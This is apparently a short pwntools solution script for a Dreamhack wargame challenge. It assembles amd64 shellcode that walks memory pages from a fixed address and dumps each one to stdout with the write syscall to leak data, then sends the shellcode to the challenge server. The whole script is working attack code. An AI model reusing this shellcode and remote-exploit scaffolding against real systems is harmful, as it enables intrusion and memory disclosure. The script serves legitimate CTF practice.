from pwn import *

context.arch = 'amd64'

port = 21698
rem = remote("host3.dreamhack.games", port)

payload = asm(
  '''
    mov r8, 0x0
  temp:
    mov rcx, r8
    shl rcx, 0xc
    mov r9, 0x080000000000
    or r9, rcx
    mov rdi, 1
    mov rsi, r9
    mov rdx, 0x1000
    mov rax, 0x1
    syscall
    inc r8
    cmp r8, 0x100000
    jle temp
  '''
)
rem.sendafter(b": ", payload)
print(rem.recvall())
